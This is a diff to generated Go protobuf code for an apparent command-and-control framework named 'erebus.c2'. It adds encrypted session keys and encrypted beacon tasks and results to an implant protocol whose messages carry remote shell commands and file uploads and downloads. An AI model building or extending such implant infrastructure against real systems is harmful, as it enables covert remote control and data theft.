@@ -236,12 +236,13 @@ func (x *Register) GetHmac() []byte {
 }
 
 type RegisterResponse struct {
-	state         protoimpl.MessageState `protogen:"open.v1"`
-	Success       bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`
-	SessionId     string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
-	NextCheckinMs int64                  `protobuf:"varint,3,opt,name=next_checkin_ms,json=nextCheckinMs,proto3" json:"next_checkin_ms,omitempty"`
-	unknownFields protoimpl.UnknownFields
-	sizeCache     protoimpl.SizeCache
+	state               protoimpl.MessageState `protogen:"open.v1"`
+	Success             bool                   `protobuf:"varint,1,opt,name=success,proto3" json:"success,omitempty"`
+	SessionId           string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
+	NextCheckinMs       int64                  `protobuf:"varint,3,opt,name=next_checkin_ms,json=nextCheckinMs,proto3" json:"next_checkin_ms,omitempty"`
+	EncryptedSessionKey []byte                 `protobuf:"bytes,4,opt,name=encrypted_session_key,json=encryptedSessionKey,proto3" json:"encrypted_session_key,omitempty"` // AES session key encrypted with pre-shared secret
+	unknownFields       protoimpl.UnknownFields
+	sizeCache           protoimpl.SizeCache
 }
 
 func (x *RegisterResponse) Reset() {
@@ -295,15 +296,23 @@ func (x *RegisterResponse) GetNextCheckinMs() int64 {
 	return 0
 }
 
+func (x *RegisterResponse) GetEncryptedSessionKey() []byte {
+	if x != nil {
+		return x.EncryptedSessionKey
+	}
+	return nil
+}
+
 type Beacon struct {
-	state         protoimpl.MessageState `protogen:"open.v1"`
-	ImplantId     string                 `protobuf:"bytes,1,opt,name=implant_id,json=implantId,proto3" json:"implant_id,omitempty"`
-	SessionId     string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
-	Timestamp     int64                  `protobuf:"varint,3,opt,name=timestamp,proto3" json:"timestamp,omitempty"`
-	Hmac          []byte                 `protobuf:"bytes,4,opt,name=hmac,proto3" json:"hmac,omitempty"`
-	Results       []*TaskResult          `protobuf:"bytes,5,rep,name=results,proto3" json:"results,omitempty"`
-	unknownFields protoimpl.UnknownFields
-	sizeCache     protoimpl.SizeCache
+	state            protoimpl.MessageState `protogen:"open.v1"`
+	ImplantId        string                 `protobuf:"bytes,1,opt,name=implant_id,json=implantId,proto3" json:"implant_id,omitempty"`
+	SessionId        string                 `protobuf:"bytes,2,opt,name=session_id,json=sessionId,proto3" json:"session_id,omitempty"`
+	Timestamp        int64                  `protobuf:"varint,3,opt,name=timestamp,proto3" json:"timestamp,omitempty"`
+	Hmac             []byte                 `protobuf:"bytes,4,opt,name=hmac,proto3" json:"hmac,omitempty"`
+	Results          []*TaskResult          `protobuf:"bytes,5,rep,name=results,proto3" json:"results,omitempty"`
+	EncryptedResults []byte                 `protobuf:"bytes,6,opt,name=encrypted_results,json=encryptedResults,proto3" json:"encrypted_results,omitempty"` // replaces results when session key active
+	unknownFields    protoimpl.UnknownFields
+	sizeCache        protoimpl.SizeCache
 }
 
 func (x *Beacon) Reset() {
@@ -371,13 +380,21 @@ func (x *Beacon) GetResults() []*TaskResult {
 	return nil
 }
 
+func (x *Beacon) GetEncryptedResults() []byte {
+	if x != nil {
+		return x.EncryptedResults
+	}
+	return nil
+}
+
 type BeaconResponse struct {
-	state         protoimpl.MessageState `protogen:"open.v1"`
-	Tasks         []*Task                `protobuf:"bytes,1,rep,name=tasks,proto3" json:"tasks,omitempty"`
-	NextCheckinMs int64                  `protobuf:"varint,2,opt,name=next_checkin_ms,json=nextCheckinMs,proto3" json:"next_checkin_ms,omitempty"`
-	Terminate     bool                   `protobuf:"varint,3,opt,name=terminate,proto3" json:"terminate,omitempty"`
-	unknownFields protoimpl.UnknownFields
-	sizeCache     protoimpl.SizeCache
+	state          protoimpl.MessageState `protogen:"open.v1"`
+	Tasks          []*Task                `protobuf:"bytes,1,rep,name=tasks,proto3" json:"tasks,omitempty"`
+	NextCheckinMs  int64                  `protobuf:"varint,2,opt,name=next_checkin_ms,json=nextCheckinMs,proto3" json:"next_checkin_ms,omitempty"`
+	Terminate      bool                   `protobuf:"varint,3,opt,name=terminate,proto3" json:"terminate,omitempty"`
+	EncryptedTasks []byte                 `protobuf:"bytes,4,opt,name=encrypted_tasks,json=encryptedTasks,proto3" json:"encrypted_tasks,omitempty"` // replaces tasks when session key active
+	unknownFields  protoimpl.UnknownFields
+	sizeCache      protoimpl.SizeCache
 }
 
 func (x *BeaconResponse) Reset() {
@@ -429,6 +446,13 @@ func (x *BeaconResponse) GetTerminate() bool {
 		return x.Terminate
 	}
 	return false
+}
+
+func (x *BeaconResponse) GetEncryptedTasks() []byte {
+	if x != nil {
+		return x.EncryptedTasks
+	}
+	return nil
 }
 
 type Task struct {
@@ -583,6 +607,95 @@ func (x *TaskResult) GetExecutionTimeMs() int64 {
 	return 0
 }
 
+// Helper messages for encrypted payloads
+type BeaconResultsPayload struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Results       []*TaskResult          `protobuf:"bytes,1,rep,name=results,proto3" json:"results,omitempty"`
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *BeaconResultsPayload) Reset() {
+	*x = BeaconResultsPayload{}
+	mi := &file_c2_proto_msgTypes[6]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *BeaconResultsPayload) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*BeaconResultsPayload) ProtoMessage() {}
+
+func (x *BeaconResultsPayload) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[6]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use BeaconResultsPayload.ProtoReflect.Descriptor instead.
+func (*BeaconResultsPayload) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{6}
+}
+
+func (x *BeaconResultsPayload) GetResults() []*TaskResult {
+	if x != nil {
+		return x.Results
+	}
+	return nil
+}
+
+type BeaconTasksPayload struct {
+	state         protoimpl.MessageState `protogen:"open.v1"`
+	Tasks         []*Task                `protobuf:"bytes,1,rep,name=tasks,proto3" json:"tasks,omitempty"`
+	unknownFields protoimpl.UnknownFields
+	sizeCache     protoimpl.SizeCache
+}
+
+func (x *BeaconTasksPayload) Reset() {
+	*x = BeaconTasksPayload{}
+	mi := &file_c2_proto_msgTypes[7]
+	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+	ms.StoreMessageInfo(mi)
+}
+
+func (x *BeaconTasksPayload) String() string {
+	return protoimpl.X.MessageStringOf(x)
+}
+
+func (*BeaconTasksPayload) ProtoMessage() {}
+
+func (x *BeaconTasksPayload) ProtoReflect() protoreflect.Message {
+	mi := &file_c2_proto_msgTypes[7]
+	if x != nil {
+		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
+		if ms.LoadMessageInfo() == nil {
+			ms.StoreMessageInfo(mi)
+		}
+		return ms
+	}
+	return mi.MessageOf(x)
+}
+
+// Deprecated: Use BeaconTasksPayload.ProtoReflect.Descriptor instead.
+func (*BeaconTasksPayload) Descriptor() ([]byte, []int) {
+	return file_c2_proto_rawDescGZIP(), []int{7}
+}
+
+func (x *BeaconTasksPayload) GetTasks() []*Task {
+	if x != nil {
+		return x.Tasks
+	}
+	return nil
+}
+
 type ShellTask struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
 	Command       string                 `protobuf:"bytes,1,opt,name=command,proto3" json:"command,omitempty"`
@@ -593,7 +706,7 @@ type ShellTask struct {
 
 func (x *ShellTask) Reset() {
 	*x = ShellTask{}
-	mi := &file_c2_proto_msgTypes[6]
+	mi := &file_c2_proto_msgTypes[8]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -605,7 +718,7 @@ func (x *ShellTask) String() string {
 func (*ShellTask) ProtoMessage() {}
 
 func (x *ShellTask) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[6]
+	mi := &file_c2_proto_msgTypes[8]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -618,7 +731,7 @@ func (x *ShellTask) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use ShellTask.ProtoReflect.Descriptor instead.
 func (*ShellTask) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{6}
+	return file_c2_proto_rawDescGZIP(), []int{8}
 }
 
 func (x *ShellTask) GetCommand() string {
@@ -646,7 +759,7 @@ type ShellResult struct {
 
 func (x *ShellResult) Reset() {
 	*x = ShellResult{}
-	mi := &file_c2_proto_msgTypes[7]
+	mi := &file_c2_proto_msgTypes[9]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -658,7 +771,7 @@ func (x *ShellResult) String() string {
 func (*ShellResult) ProtoMessage() {}
 
 func (x *ShellResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[7]
+	mi := &file_c2_proto_msgTypes[9]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -671,7 +784,7 @@ func (x *ShellResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use ShellResult.ProtoReflect.Descriptor instead.
 func (*ShellResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{7}
+	return file_c2_proto_rawDescGZIP(), []int{9}
 }
 
 func (x *ShellResult) GetStdout() string {
@@ -705,7 +818,7 @@ type FileDownloadTask struct {
 
 func (x *FileDownloadTask) Reset() {
 	*x = FileDownloadTask{}
-	mi := &file_c2_proto_msgTypes[8]
+	mi := &file_c2_proto_msgTypes[10]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -717,7 +830,7 @@ func (x *FileDownloadTask) String() string {
 func (*FileDownloadTask) ProtoMessage() {}
 
 func (x *FileDownloadTask) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[8]
+	mi := &file_c2_proto_msgTypes[10]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -730,7 +843,7 @@ func (x *FileDownloadTask) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use FileDownloadTask.ProtoReflect.Descriptor instead.
 func (*FileDownloadTask) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{8}
+	return file_c2_proto_rawDescGZIP(), []int{10}
 }
 
 func (x *FileDownloadTask) GetRemotePath() string {
@@ -750,7 +863,7 @@ type FileDownloadResult struct {
 
 func (x *FileDownloadResult) Reset() {
 	*x = FileDownloadResult{}
-	mi := &file_c2_proto_msgTypes[9]
+	mi := &file_c2_proto_msgTypes[11]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -762,7 +875,7 @@ func (x *FileDownloadResult) String() string {
 func (*FileDownloadResult) ProtoMessage() {}
 
 func (x *FileDownloadResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[9]
+	mi := &file_c2_proto_msgTypes[11]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -775,7 +888,7 @@ func (x *FileDownloadResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use FileDownloadResult.ProtoReflect.Descriptor instead.
 func (*FileDownloadResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{9}
+	return file_c2_proto_rawDescGZIP(), []int{11}
 }
 
 func (x *FileDownloadResult) GetFilename() string {
@@ -802,7 +915,7 @@ type FileUploadTask struct {
 
 func (x *FileUploadTask) Reset() {
 	*x = FileUploadTask{}
-	mi := &file_c2_proto_msgTypes[10]
+	mi := &file_c2_proto_msgTypes[12]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -814,7 +927,7 @@ func (x *FileUploadTask) String() string {
 func (*FileUploadTask) ProtoMessage() {}
 
 func (x *FileUploadTask) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[10]
+	mi := &file_c2_proto_msgTypes[12]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -827,7 +940,7 @@ func (x *FileUploadTask) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use FileUploadTask.ProtoReflect.Descriptor instead.
 func (*FileUploadTask) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{10}
+	return file_c2_proto_rawDescGZIP(), []int{12}
 }
 
 func (x *FileUploadTask) GetRemotePath() string {
@@ -853,7 +966,7 @@ type FileUploadResult struct {
 
 func (x *FileUploadResult) Reset() {
 	*x = FileUploadResult{}
-	mi := &file_c2_proto_msgTypes[11]
+	mi := &file_c2_proto_msgTypes[13]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -865,7 +978,7 @@ func (x *FileUploadResult) String() string {
 func (*FileUploadResult) ProtoMessage() {}
 
 func (x *FileUploadResult) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[11]
+	mi := &file_c2_proto_msgTypes[13]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -878,7 +991,7 @@ func (x *FileUploadResult) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use FileUploadResult.ProtoReflect.Descriptor instead.
 func (*FileUploadResult) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{11}
+	return file_c2_proto_rawDescGZIP(), []int{13}
 }
 
 func (x *FileUploadResult) GetSuccess() bool {
@@ -898,7 +1011,7 @@ type SleepTask struct {
 
 func (x *SleepTask) Reset() {
 	*x = SleepTask{}
-	mi := &file_c2_proto_msgTypes[12]
+	mi := &file_c2_proto_msgTypes[14]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -910,7 +1023,7 @@ func (x *SleepTask) String() string {
 func (*SleepTask) ProtoMessage() {}
 
 func (x *SleepTask) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[12]
+	mi := &file_c2_proto_msgTypes[14]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -923,7 +1036,7 @@ func (x *SleepTask) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use SleepTask.ProtoReflect.Descriptor instead.
 func (*SleepTask) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{12}
+	return file_c2_proto_rawDescGZIP(), []int{14}
 }
 
 func (x *SleepTask) GetSleepMs() int64 {
@@ -950,7 +1063,7 @@ type ModuleTask struct {
 
 func (x *ModuleTask) Reset() {
 	*x = ModuleTask{}
-	mi := &file_c2_proto_msgTypes[13]
+	mi := &file_c2_proto_msgTypes[15]
 	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 	ms.StoreMessageInfo(mi)
 }
@@ -962,7 +1075,7 @@ func (x *ModuleTask) String() string {
 func (*ModuleTask) ProtoMessage() {}
 
 func (x *ModuleTask) ProtoReflect() protoreflect.Message {
-	mi := &file_c2_proto_msgTypes[13]
+	mi := &file_c2_proto_msgTypes[15]
 	if x != nil {
 		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
 		if ms.LoadMessageInfo() == nil {
@@ -975,7 +1088,7 @@ func (x *ModuleTask) ProtoReflect() protoreflect.Message {
 
 // Deprecated: Use ModuleTask.ProtoReflect.Descriptor instead.
 func (*ModuleTask) Descriptor() ([]byte, []int) {
-	return file_c2_proto_rawDescGZIP(), []int{13}
+	return file_c2_proto_rawDescGZIP(), []int{15}
 }
 
 func (x *ModuleTask) GetModuleName() string {
@@ -1007,12 +1120,13 @@ const file_c2_proto_rawDesc = "" +
 	"\x03pid\x18\x06 \x01(\rR\x03pid\x12'\n" +
 	"\x0fintegrity_level\x18\a \x01(\tR\x0eintegrityLevel\x12\x1c\n" +
 	"\ttimestamp\x18\b \x01(\x03R\ttimestamp\x12\x12\n" +
-	"\x04hmac\x18\t \x01(\fR\x04hmac\"s\n" +
+	"\x04hmac\x18\t \x01(\fR\x04hmac\"\xa7\x01\n" +
 	"\x10RegisterResponse\x12\x18\n" +
 	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x1d\n" +
 	"\n" +
 	"session_id\x18\x02 \x01(\tR\tsessionId\x12&\n" +
-	"\x0fnext_checkin_ms\x18\x03 \x01(\x03R\rnextCheckinMs\"\xa9\x01\n" +
+	"\x0fnext_checkin_ms\x18\x03 \x01(\x03R\rnextCheckinMs\x122\n" +
+	"\x15encrypted_session_key\x18\x04 \x01(\fR\x13encryptedSessionKey\"\xd6\x01\n" +
 	"\x06Beacon\x12\x1d\n" +
 	"\n" +
 	"implant_id\x18\x01 \x01(\tR\timplantId\x12\x1d\n" +
@@ -1020,11 +1134,13 @@ const file_c2_proto_rawDesc = "" +
 	"session_id\x18\x02 \x01(\tR\tsessionId\x12\x1c\n" +
 	"\ttimestamp\x18\x03 \x01(\x03R\ttimestamp\x12\x12\n" +
 	"\x04hmac\x18\x04 \x01(\fR\x04hmac\x12/\n" +
-	"\aresults\x18\x05 \x03(\v2\x15.erebus.c2.TaskResultR\aresults\"}\n" +
+	"\aresults\x18\x05 \x03(\v2\x15.erebus.c2.TaskResultR\aresults\x12+\n" +
+	"\x11encrypted_results\x18\x06 \x01(\fR\x10encryptedResults\"\xa6\x01\n" +
 	"\x0eBeaconResponse\x12%\n" +
 	"\x05tasks\x18\x01 \x03(\v2\x0f.erebus.c2.TaskR\x05tasks\x12&\n" +
 	"\x0fnext_checkin_ms\x18\x02 \x01(\x03R\rnextCheckinMs\x12\x1c\n" +
-	"\tterminate\x18\x03 \x01(\bR\tterminate\"\xa3\x01\n" +
+	"\tterminate\x18\x03 \x01(\bR\tterminate\x12'\n" +
+	"\x0fencrypted_tasks\x18\x04 \x01(\fR\x0eencryptedTasks\"\xa3\x01\n" +
 	"\x04Task\x12\x17\n" +
 	"\atask_id\x18\x01 \x01(\tR\x06taskId\x12\x1d\n" +
 	"\n" +
@@ -1039,7 +1155,11 @@ const file_c2_proto_rawDesc = "" +
 	"\asuccess\x18\x02 \x01(\bR\asuccess\x12\x12\n" +
 	"\x04data\x18\x03 \x01(\fR\x04data\x12\x14\n" +
 	"\x05error\x18\x04 \x01(\tR\x05error\x12*\n" +
-	"\x11execution_time_ms\x18\x05 \x01(\x03R\x0fexecutionTimeMs\"9\n" +
+	"\x11execution_time_ms\x18\x05 \x01(\x03R\x0fexecutionTimeMs\"G\n" +
+	"\x14BeaconResultsPayload\x12/\n" +
+	"\aresults\x18\x01 \x03(\v2\x15.erebus.c2.TaskResultR\aresults\";\n" +
+	"\x12BeaconTasksPayload\x12%\n" +
+	"\x05tasks\x18\x01 \x03(\v2\x0f.erebus.c2.TaskR\x05tasks\"9\n" +
 	"\tShellTask\x12\x18\n" +
 	"\acommand\x18\x01 \x01(\tR\acommand\x12\x12\n" +
 	"\x04args\x18\x02 \x03(\tR\x04args\"Z\n" +
@@ -1108,33 +1228,37 @@ func file_c2_proto_rawDescGZIP() []byte {
 }
 
 var file_c2_proto_enumTypes = make([]protoimpl.EnumInfo, 1)
-var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 14)
+var file_c2_proto_msgTypes = make([]protoimpl.MessageInfo, 16)
 var file_c2_proto_goTypes = []any{
-	(TaskType)(0),              // 0: erebus.c2.TaskType
-	(*Register)(nil),           // 1: erebus.c2.Register
-	(*RegisterResponse)(nil),   // 2: erebus.c2.RegisterResponse
-	(*Beacon)(nil),             // 3: erebus.c2.Beacon
-	(*BeaconResponse)(nil),     // 4: erebus.c2.BeaconResponse
-	(*Task)(nil),               // 5: erebus.c2.Task
-	(*TaskResult)(nil),         // 6: erebus.c2.TaskResult
-	(*ShellTask)(nil),          // 7: erebus.c2.ShellTask
-	(*ShellResult)(nil),        // 8: erebus.c2.ShellResult
-	(*FileDownloadTask)(nil),   // 9: erebus.c2.FileDownloadTask
-	(*FileDownloadResult)(nil), // 10: erebus.c2.FileDownloadResult
-	(*FileUploadTask)(nil),     // 11: erebus.c2.FileUploadTask
-	(*FileUploadResult)(nil),   // 12: erebus.c2.FileUploadResult
-	(*SleepTask)(nil),          // 13: erebus.c2.SleepTask
-	(*ModuleTask)(nil),         // 14: erebus.c2.ModuleTask
+	(TaskType)(0),                // 0: erebus.c2.TaskType
+	(*Register)(nil),             // 1: erebus.c2.Register
+	(*RegisterResponse)(nil),     // 2: erebus.c2.RegisterResponse
+	(*Beacon)(nil),               // 3: erebus.c2.Beacon
+	(*BeaconResponse)(nil),       // 4: erebus.c2.BeaconResponse
+	(*Task)(nil),                 // 5: erebus.c2.Task
+	(*TaskResult)(nil),           // 6: erebus.c2.TaskResult
+	(*BeaconResultsPayload)(nil), // 7: erebus.c2.BeaconResultsPayload
+	(*BeaconTasksPayload)(nil),   // 8: erebus.c2.BeaconTasksPayload
+	(*ShellTask)(nil),            // 9: erebus.c2.ShellTask
+	(*ShellResult)(nil),          // 10: erebus.c2.ShellResult
+	(*FileDownloadTask)(nil),     // 11: erebus.c2.FileDownloadTask
+	(*FileDownloadResult)(nil),   // 12: erebus.c2.FileDownloadResult
+	(*FileUploadTask)(nil),       // 13: erebus.c2.FileUploadTask
+	(*FileUploadResult)(nil),     // 14: erebus.c2.FileUploadResult
+	(*SleepTask)(nil),            // 15: erebus.c2.SleepTask
+	(*ModuleTask)(nil),           // 16: erebus.c2.ModuleTask
 }
 var file_c2_proto_depIdxs = []int32{
 	6, // 0: erebus.c2.Beacon.results:type_name -> erebus.c2.TaskResult
 	5, // 1: erebus.c2.BeaconResponse.tasks:type_name -> erebus.c2.Task
 	0, // 2: erebus.c2.Task.task_type:type_name -> erebus.c2.TaskType
-	3, // [3:3] is the sub-list for method output_type
-	3, // [3:3] is the sub-list for method input_type
-	3, // [3:3] is the sub-list for extension type_name
-	3, // [3:3] is the sub-list for extension extendee
-	0, // [0:3] is the sub-list for field type_name
+	6, // 3: erebus.c2.BeaconResultsPayload.results:type_name -> erebus.c2.TaskResult
+	5, // 4: erebus.c2.BeaconTasksPayload.tasks:type_name -> erebus.c2.Task
+	5, // [5:5] is the sub-list for method output_type
+	5, // [5:5] is the sub-list for method input_type
+	5, // [5:5] is the sub-list for extension type_name
+	5, // [5:5] is the sub-list for extension extendee
+	0, // [0:5] is the sub-list for field type_name
 }
 
 func init() { file_c2_proto_init() }
@@ -1148,7 +1272,7 @@ func file_c2_proto_init() {
 			GoPackagePath: reflect.TypeOf(x{}).PkgPath(),
 			RawDescriptor: unsafe.Slice(unsafe.StringData(file_c2_proto_rawDesc), len(file_c2_proto_rawDesc)),
 			NumEnums:      1,
-			NumMessages:   14,
+			NumMessages:   16,
 			NumExtensions: 0,
 			NumServices:   0,
 		},
